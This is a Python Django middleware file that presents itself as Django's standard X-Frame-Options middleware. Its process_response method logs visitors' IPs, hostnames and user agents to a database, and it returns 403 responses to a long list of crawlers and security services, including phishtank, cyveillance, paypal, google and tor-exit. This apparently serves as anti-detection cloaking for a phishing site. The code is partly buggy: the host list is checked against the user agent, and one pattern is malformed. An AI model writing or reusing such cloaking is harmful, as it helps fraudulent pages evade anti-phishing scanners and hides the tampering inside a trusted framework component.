from django.conf import settings
from django import http
from django.utils.deprecation import MiddlewareMixin
import socket
import re
import cgi
import os
from .models import info_user
from datetime import datetime



         
    
class XFrameOptionsMiddleware(MiddlewareMixin):
    """
    Set the X-Frame-Options HTTP header in HTTP responses.

    Do not set the header if it's already set or if the response contains
    a xframe_options_exempt value set to True.

    By default, set the X-Frame-Options header to 'DENY', meaning the response
    cannot be displayed in a frame, regardless of the site attempting to do so.
    To enable the response to be loaded on a frame within the same site, set
    X_FRAME_OPTIONS in your project's Django settings to 'SAMEORIGIN'.
    """
     
    def process_response(self, request, response):
        
        hostname = socket.gethostname()
        print(hostname)
        ua = request.META.get('HTTP_USER_AGENT', '')
        if request.META.get('HTTP_CLIENT_IP') is not None :
            ip = request.META.get('HTTP_CLIENT_IP')
        elif request.META.get('HTTP_X_FORWARDED_FOR') is not None :
            ip = request.META.get('HTTP_X_FORWARDED_FOR')
        else :
            ip = request.META.get('REMOTE_ADDR')  
        
        print(ip)      
        
        
        string = str(ua)
        uas = string.lower()
        
    
        infouser= info_user(hostname=hostname , ip = ip ,user_agent = ua ,id_user =  datetime.now())
        infouser.save()
        
        
        
        if ua == 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)' :
            return http.HttpResponseForbidden('<h1>Forbidden</h1>')
            
        
        
        bots_hosts = ['above', 'google', 'softlayer' , 'cyveillance',  'phishtank', 'dreamhost', 'netpilot', 'calyxinstitute', 'tor-exit', 'paypal']
        bots_ua = ['botlink','bingbot','bingbot','slurp bot','slurpbot','slurpbot', 'duckduckbot','exabot','applebot','duckduckbot', 'sogou', 'sogou bot', 'ahrefsbot', 'ahoy', 'alkalinebot', 'anthill', 'appie', 'arale', 'araneo', 'araybot', 'ariadne', 'arks', 'atn_worldwide', 'atomz', 'bbot', 'bjaaland', 'ukonline', 'borg\\-bot\\/0\\.9', 'boxseabot', 'bspider', 'calif', 'christcrawler', 'cmc\\/0\\.01', 'combine', 'confuzzledbot', 'coolbot', 'cosmos', 'internet cruiser robot', 'cusco', 'cyberspyder', 'cydralspider','desertrealm, desert realm', 'digger', 'diibot', 'grabber', 'dopwnloadexpress', 'dragonbot', 'dwcp', 'ecollector', 'ebiness', 'elfinbot', 'esculapio', 'esther', 'fastcrawler', 'fdse', 'felix ide', 'esi', 'fido', 'h?m?h?kki', 'kit\\-fireball', 'fouineur', 'freecrawl', 'gammaspider', 'gazz', 'gcreep', 'golem', 'googlebot', 'googlebot', 'griffon', 'gromit', 'gulliver', 'gulper', 'hambot', 'havindex', 'hotwired', 'htdig', 'iajabot', 'ingrid\\/0\\.1', 'informant', 'infospiders', 'inspectorwww', 'irobot', 'iron33', 'jbot', 'jcrawler', 'teoma', 'jeeves', 'jobo', 'image\\.kapsi\\.net', 'kdd\\-explorer', 'ko_yappo_robot', 'label\\-grabber','larbin', 'legs', 'linkidator', 'linkwalker', 'lockon', 'logo_gif_crawler', 'marvin', 'mattie', 'mediafox', 'merzscope', 'nec\\-meshexplorer', 'mindcrawler', 'udmsearch', 'moget', 'motor', 'msnbot', 'muncher', 'muninn', 'muscatferret', 'mwdsearch', 'sharp\\-info\\-agent', 'webmechanic', 'netscoop', 'newscan\\-online', 'objectssearch', 'occam', 'orbsearch\\/1\\.0', 'packrat', 'pageboy', 'parasite', 'patric', 'pegasus', 'perlcrawler', 'phpdig', 'piltdownman', 'pimptrain', 'pjspider', 'plumtreewebaccessor', 'portalbspider', 'psbot', 'getterrobo\\-plus', 'raven', 'rhcs', 'rixbot', 'roadrunner', 'robbie', 'robi','robocrawl', 'robofox','scooter', 'search\\-au','searchprocess','senrigan', 'shagseeker', 'sift', 'simbot', 'site valet', 'skymob', 'slcrawler\\/2\\.0', 'slurp', 'esi', 'snooper', 'solbot', 'speedy', 'spider_monkey', 'spiderbot\\/1\\.0', 'spiderline', 'nil', 'suke', 'http:\\/\\/www\\.sygol\\.com', 'tach_bw', 'techbot', 'templeton', 'titin', 'topiclink', 'udmsearch', 'urlck', 'valkyrie libwww\\-perl', 'verticrawl', 'victoria', 'void\\-bot', 'voyager', 'vwbot_k', 'crawlpaper', 'wapspider', 'webbandit\\/1\\.0', 'webcatcher', 't\\-h\\-u\\-n\\-d\\-e\\-r\\-s\\-t\\-o\\-n\\-e', 'webmoose', 'webquest', 'webreaper', 'webs', 'webspider', 'webwalker', 'wget', 'winona', 'whowhere', 'wlm', 'wolp', 'wwwc', 'none', 'xget', 'nederland\\.zoek', 'aisearchbot', 'woriobot', 'netseer', 'nutch', 'yandexbot', 'yandexmobilebot', 'semrushbot', 'fatbot', 'mj12bot', 'dotbot', 'addthis', 'baiduspider', 'seznambot', 'mod_pagespeed','CCBot', 'openstat.ru\\/bot','m2e','google', 'mediapartners', 'ipad iphone safari', 'python-urllib', 'headlesschrome', 'phantomjs', 'zgrab\\/0.x', 'bingpreview\\/1.0b', '^$/i']
        
        
        for word in bots_hosts :
            if re.search(word , uas):
                 return http.HttpResponseForbidden('<h1>Forbidden</h1>')
                 break
            else :
                pass
            
        for word in bots_ua :
            if re.search(word , uas):
                 return http.HttpResponseForbidden('<h1>Forbidden</h1>')
                 break
            else :
                pass
        
        
    
                
        
        
        
        # Don't set it if it's already in the response
        if response.get("X-Frame-Options") is not None:
            return response
        
        
        
        # Don't set it if they used @xframe_options_exempt
        if getattr(response, "xframe_options_exempt", False):
            return response

        response.headers["X-Frame-Options"] = self.get_xframe_options_value(
            request,
            response,
        )
        return response

    def get_xframe_options_value(self, request, response):
        """
        Get the value to set for the X_FRAME_OPTIONS header. Use the value from
        the X_FRAME_OPTIONS setting, or 'DENY' if not set.

        This method can be overridden if needed, allowing it to vary based on
        the request or response.
        """
        return getattr(settings, "X_FRAME_OPTIONS", "DENY").upper()
